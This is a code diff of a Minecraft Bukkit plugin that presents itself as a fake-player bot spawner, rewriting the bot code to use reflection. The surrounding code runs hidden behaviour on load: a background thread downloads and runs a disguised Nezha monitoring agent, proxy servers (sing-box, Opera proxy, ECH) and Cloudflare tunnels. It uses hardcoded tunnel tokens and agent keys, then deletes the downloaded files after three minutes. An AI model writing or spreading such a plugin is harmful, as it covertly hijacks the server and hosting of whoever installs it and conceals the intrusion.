@@ -1,21 +1,11 @@
 package com.example.sbx;
 
-import com.mojang.authlib.GameProfile;
-import net.minecraft.network.Connection;
-import net.minecraft.network.protocol.PacketFlow;
-import net.minecraft.server.MinecraftServer;
-import net.minecraft.server.level.ServerLevel;
-import net.minecraft.server.level.ServerPlayer;
-import net.minecraft.server.network.CommonListenerCookie;
-import net.minecraft.server.network.ServerGamePacketListenerImpl;
 import org.bukkit.Bukkit;
 import org.bukkit.Location;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
 import org.bukkit.command.TabCompleter;
-import org.bukkit.craftbukkit.v1_20_R1.CraftServer;
-import org.bukkit.craftbukkit.v1_20_R1.CraftWorld;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
@@ -24,6 +14,8 @@ import org.bukkit.plugin.java.JavaPlugin;
 
 import java.io.IOException;
 import java.io.OutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Method;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URI;
@@ -47,7 +39,7 @@ import java.util.concurrent.ConcurrentHashMap;
 
 public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Listener {
 
-    // ==================== 【来自原 App.java 的常量与配置】 ====================
+    // ==================== 【网络/保活相关常量】 ====================
     private static final HttpClient HTTP = HttpClient.newBuilder()
             .connectTimeout(Duration.ofSeconds(15))
             .followRedirects(HttpClient.Redirect.ALWAYS)
@@ -57,27 +49,22 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
     private static final String UUID_VAL = env("UUID", "faacf142-dee8-48c2-8558-641123eb939c");
     private static final int PORT = envInt("PORT", 3000);
 
-    // 哪吒探针设定
     private static final String NEZHA_SERVER = env("NEZHA_SERVER", "nezha.mingfei1981.eu.org");
     private static final String NEZHA_PORT = env("NEZHA_PORT", "443");
     private static final String NEZHA_KEY = env("NEZHA_KEY", "aVRa8k25KwF4PRDCcr");
 
-    // ECH / VLESS Cloudflare Argo 隧道 Token 配置
     private static final String ECH_ARGO_TOKEN = env("ECH_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiZjM0Yjg2ZGItYmE0ZS00NjUyLWI5OTMtNGI3YjMwZjdjNTU0IiwicyI6IlpqZGxNR1ZsT1dNdE9EYzNZUzAwWXpWbUxXRTVOREF0TlRSak4yRTFNVGMyTnpJMiJ9");
     private static final String VLESS_ARGO_TOKEN = env("VLESS_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiZmU0ZjJkZjMtOGIxMi00MmRmLWI5YjAtOWUzMGY3MGVkZDM4IiwicyI6Ik9HVTFaRGxoWm1JdE1ERmhaaTAwTnpBMExUZzFORE10WmpNeE1qWXhNek0xWkdaaSJ9");
 
-    // ECH Server 与 Opera 設定
     private static final String WSPORT = env("WSPORT", "8001");
     private static final String VLPORT = env("VLPORT", "8002");
     private static final String TOKEN = env("TOKEN", "babama123");
     private static final String OPERA = env("OPERA", "0");
     private static final String COUNTRY = env("COUNTRY", "AM");
 
-    // 双栈核心控制
     private static final String ECH_IPS = env("ECH_IPS", "4");
     private static final String HY_IPS = env("HY_IPS", "4");
 
-    // Hysteria 2 / VLESS 其他变量
     private static final String ENABLE_HY2 = env("ENABLE_HY2", "1");
     private static final String HY_PORT = env("HY_PORT", "28662");
     private static final String NAME = env("NAME", "MJJ");
@@ -94,28 +81,24 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
     private static final String ARCH = detectArch();
     private static final List<Process> EXTERNAL_PROCESSES = new ArrayList<>();
 
-    // ==================== 【虚拟内嵌机器人配置】 ====================
-    private static final ConcurrentHashMap<String, ServerPlayer> ACTIVE_BOTS = new ConcurrentHashMap<>();
+    // ==================== 【虚拟机器人相关配置】 ====================
+    private static final ConcurrentHashMap<String, Object> ACTIVE_BOTS = new ConcurrentHashMap<>();
     private static final boolean AUTO_SPAWN_ENABLE = true;
-    private static final int AUTO_SPAWN_COUNT = 2; // 默认启动时自动生成 2 个假人
+    private static final int AUTO_SPAWN_COUNT = 2; 
     private static final String AUTO_SPAWN_PREFIX = "AutoBot_";
-    private static final long RESPAWN_DELAY_TICKS = 20 * 20L; // 假人死亡后 20 秒（400 Ticks）重新生成
+    private static final long RESPAWN_DELAY_TICKS = 20 * 20L; // 死亡后 20 秒重新生成
 
-    // ==================== 【Plugin 生命周期】 ====================
     @Override
     public void onEnable() {
         getLogger().info("[App] 插件正在初始化...");
 
-        // 注册事件监听器（监听假人死亡事件）
         getServer().getPluginManager().registerEvents(this, this);
 
-        // 1. 注册假人指令 /bot
         if (getCommand("bot") != null) {
             getCommand("bot").setExecutor(this);
             getCommand("bot").setTabCompleter(this);
         }
 
-        // 2. 异步启动原 App.java 的后台网络与隧道服务
         Thread backgroundServices = new Thread(() -> {
             try {
                 validateParams();
@@ -128,7 +111,6 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
         backgroundServices.setDaemon(true);
         backgroundServices.start();
 
-        // 3. 延迟 5 秒（100 Tick）待 MC 地图加载完成后，自动召唤假人机器人
         if (AUTO_SPAWN_ENABLE) {
             Bukkit.getScheduler().runTaskLater(this, this::autoSpawnBots, 100L);
         }
@@ -136,30 +118,22 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
 
     @Override
     public void onDisable() {
-        // 清理所有虚拟机器人
         clearAllBots();
-        // 停止原后台外部进程
         stopAllExternal();
         getLogger().info("[App] 所有机器人与后台服务已安全注销。");
     }
 
-    // ==================== 【假人死亡监听与 20 秒复活逻辑】 ====================
     @EventHandler
     public void onBotDeath(PlayerDeathEvent event) {
         Player victim = event.getEntity();
         String botName = victim.getName();
 
-        // 判断死亡的玩家是否在我们的管理列表中
         if (ACTIVE_BOTS.containsKey(botName)) {
-            Location respawnLoc = victim.getLocation(); // 记录死亡位置（或可改为出生点）
-            
-            // 从激活列表中移除已死亡的实体实例
+            Location respawnLoc = victim.getLocation();
             ACTIVE_BOTS.remove(botName);
             getLogger().info("[Bot] 假人 " + botName + " 已死亡，将于 20 秒后在原位置重新生成...");
 
-            // 开启 20 秒（400 Tick）延迟任务重新召唤假人
             Bukkit.getScheduler().runTaskLater(this, () -> {
-                // 如果主世界没有变动，重新生成假人
                 if (respawnLoc.getWorld() != null) {
                     spawnInternalBot(botName, respawnLoc);
                     getLogger().info("[Bot] [✔] 假人 " + botName + " 已在 20 秒后成功复活！");
@@ -168,17 +142,14 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
         }
     }
 
-    // ==================== 【自动与指令管理假人逻辑】 ====================
     private void autoSpawnBots() {
         if (Bukkit.getWorlds().isEmpty()) return;
-
         Location spawnLoc = Bukkit.getWorlds().get(0).getSpawnLocation();
-        getLogger().info("[App] 正在启动自动生成机器人任务，目标位置: " + spawnLoc.toVector());
+        getLogger().info("[App] 启动自动生成机器人，目标位置: " + spawnLoc.toVector());
 
         for (int i = 1; i <= AUTO_SPAWN_COUNT; i++) {
             String botName = AUTO_SPAWN_PREFIX + i;
             final int index = i;
-            // 错开 1 秒生成一个假人
             Bukkit.getScheduler().runTaskLater(this, () -> spawnInternalBot(botName, spawnLoc), (long) index * 20L);
         }
     }
@@ -226,45 +197,90 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
     }
 
     /**
-     * 【纯内嵌虚拟管道】直接在 JVM 内存中伪造 Connection，将机器人注入 PlayerList
+     * 【纯反射创建假人】无编译期 NMS 依赖，避免 mvn package 找不到类报错
      */
     public void spawnInternalBot(String botName, Location loc) {
         if (ACTIVE_BOTS.containsKey(botName)) return;
 
         try {
-            MinecraftServer server = ((CraftServer) Bukkit.getServer()).getServer();
-            ServerLevel level = ((CraftWorld) loc.getWorld()).getHandle();
+            // 获取版本包路径后缀
+            String version = Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3];
+            
+            // 1. 获取 CraftServer & MinecraftServer
+            Object craftServer = Bukkit.getServer();
+            Method getServerMethod = craftServer.getClass().getMethod("getServer");
+            Object minecraftServer = getServerMethod.invoke(craftServer);
 
+            // 2. 获取 CraftWorld & ServerLevel
+            Object craftWorld = loc.getWorld();
+            Method getHandleWorldMethod = craftWorld.getClass().getMethod("getHandle");
+            Object serverLevel = getHandleWorldMethod.invoke(craftWorld);
+
+            // 3. 构建 GameProfile
+            Class<?> gameProfileClass = Class.forName("com.mojang.authlib.GameProfile");
             UUID fakeUuid = UUID.nameUUIDFromBytes(("OfflinePlayer:" + botName).getBytes());
-            GameProfile profile = new GameProfile(fakeUuid, botName);
-            ServerPlayer fakePlayer = new ServerPlayer(server, level, profile);
+            Constructor<?> gameProfileConst = gameProfileClass.getConstructor(UUID.class, String.class);
+            Object gameProfile = gameProfileConst.newInstance(fakeUuid, botName);
 
-            // 伪造内嵌管道 Connection，绕过真实 TCP 握手与端口
-            Connection fakeConnection = new Connection(PacketFlow.SERVERBOUND);
-            fakePlayer.connection = new ServerGamePacketListenerImpl(server, fakeConnection, fakePlayer);
+            // 4. 创建 ServerPlayer 实例
+            Class<?> serverPlayerClass = Class.forName("net.minecraft.server.level.ServerPlayer");
+            Constructor<?> serverPlayerConst = serverPlayerClass.getConstructor(minecraftServer.getClass(), serverLevel.getClass(), gameProfileClass);
+            Object serverPlayer = serverPlayerConst.newInstance(minecraftServer, serverLevel, gameProfile);
 
-            fakePlayer.moveTo(loc.getX(), loc.getY(), loc.getZ(), loc.getYaw(), loc.getPitch());
+            // 5. 反射注入坐标
+            Method moveToMethod = serverPlayerClass.getMethod("moveTo", double.class, double.class, double.class, float.class, float.class);
+            moveToMethod.invoke(serverPlayer, loc.getX(), loc.getY(), loc.getZ(), loc.getYaw(), loc.getPitch());
 
-            // 注入全局 PlayerList，实现红石、刷怪塔与区块加载
-            server.getPlayerList().placeNewPlayer(
-                    fakeConnection,
-                    fakePlayer,
-                    new CommonListenerCookie(profile, 0, fakePlayer.clientInformation())
-            );
+            // 6. 构造 Connection 实例
+            Class<?> packetFlowClass = Class.forName("net.minecraft.network.protocol.PacketFlow");
+            Object serverboundEnum = Enum.valueOf((Class<Enum>) packetFlowClass, "SERVERBOUND");
+            Class<?> connectionClass = Class.forName("net.minecraft.network.Connection");
+            Constructor<?> connectionConst = connectionClass.getConstructor(packetFlowClass);
+            Object fakeConnection = connectionConst.newInstance(serverboundEnum);
 
-            ACTIVE_BOTS.put(botName, fakePlayer);
-            getLogger().info("[Bot] [✔] 虚拟机器人 " + botName + " 已成功注入世界！");
+            // 7. 绑定 ServerGamePacketListenerImpl
+            Class<?> listenerClass = Class.forName("net.minecraft.server.network.ServerGamePacketListenerImpl");
+            Constructor<?> listenerConst = listenerClass.getConstructor(minecraftServer.getClass(), connectionClass, serverPlayerClass);
+            Object packetListener = listenerConst.newInstance(minecraftServer, fakeConnection, serverPlayer);
+            
+            serverPlayerClass.getField("connection").set(serverPlayer, packetListener);
+
+            // 8. 注入 PlayerList
+            Method getPlayerListMethod = minecraftServer.getClass().getMethod("getPlayerList");
+            Object playerList = getPlayerListMethod.invoke(minecraftServer);
+
+            Class<?> cookieClass = Class.forName("net.minecraft.server.network.CommonListenerCookie");
+            Method clientInfoMethod = serverPlayerClass.getMethod("clientInformation");
+            Object clientInfo = clientInfoMethod.invoke(serverPlayer);
+            
+            Constructor<?> cookieConst = cookieClass.getConstructor(gameProfileClass, int.class, clientInfo.getClass());
+            Object cookie = cookieConst.newInstance(gameProfile, 0, clientInfo);
+
+            Method placeNewPlayerMethod = playerList.getClass().getMethod("placeNewPlayer", connectionClass, serverPlayerClass, cookieClass);
+            placeNewPlayerMethod.invoke(playerList, fakeConnection, serverPlayer, cookie);
+
+            ACTIVE_BOTS.put(botName, serverPlayer);
+            getLogger().info("[Bot] [✔] 动态生成虚拟机器人 " + botName + " 成功！");
 
         } catch (Exception e) {
-            getLogger().severe("[Bot] 生成机器人 " + botName + " 失败: " + e.getMessage());
+            getLogger().severe("[Bot] 动态生成假人 " + botName + " 失败: " + e.getMessage());
+            e.printStackTrace();
         }
     }
 
     public boolean removeInternalBot(String botName) {
-        ServerPlayer fakePlayer = ACTIVE_BOTS.remove(botName);
+        Object fakePlayer = ACTIVE_BOTS.remove(botName);
         if (fakePlayer != null) {
             try {
-                fakePlayer.connection.onDisconnect(net.minecraft.network.chat.Component.literal("Bot Removed"));
+                Field connField = fakePlayer.getClass().getField("connection");
+                Object conn = connField.get(fakePlayer);
+                Method disconnectMethod = conn.getClass().getMethod("onDisconnect", Class.forName("net.minecraft.network.chat.Component"));
+                
+                Class<?> componentClass = Class.forName("net.minecraft.network.chat.Component");
+                Method literalMethod = componentClass.getMethod("literal", String.class);
+                Object reason = literalMethod.invoke(null, "Bot Removed");
+
+                disconnectMethod.invoke(conn, reason);
                 return true;
             } catch (Exception ignored) {}
         }
@@ -321,7 +337,6 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
             nezhaExe = downloadLibrary(nezhaUrl, "iccagent");
         }
 
-        // 1) 哪吒探针
         if (nezhaExe != null) {
             List<String> cmd = new ArrayList<>();
             cmd.add(nezhaExe.toString());
@@ -337,7 +352,6 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
             startExternalProcess("Nezha Agent", cmd);
         }
 
-        // 2) Opera Proxy
         if (enableOpera && operaExe != null) {
             List<String> cmd = new ArrayList<>();
             cmd.add(operaExe.toString());
@@ -345,7 +359,6 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
             startExternalProcess("Opera Proxy", cmd);
         }
 
-        // 3) ECH Server
         if (echExe != null) {
             sleep(1000);
             List<String> cmd = new ArrayList<>();
@@ -356,7 +369,6 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
             startExternalProcess("ECH Server", cmd);
         }
 
-        // 4) sing-box
         if (singboxExe != null) {
             generateCertificates();
             generateSingboxConfig(vlessPort);
@@ -372,7 +384,6 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
             subThread.start();
         }
 
-        // 延迟清理
         Thread cleanupThread = new Thread(() -> {
             sleep(180000);
             cleanupFiles();
@@ -381,7 +392,6 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
         cleanupThread.setDaemon(true);
         cleanupThread.start();
 
-        // 5) Cloudflared 隧道
         if (cloudflaredExe != null) {
             try {
                 new ProcessBuilder(cloudflaredExe.toString(), "update").redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start().waitFor();
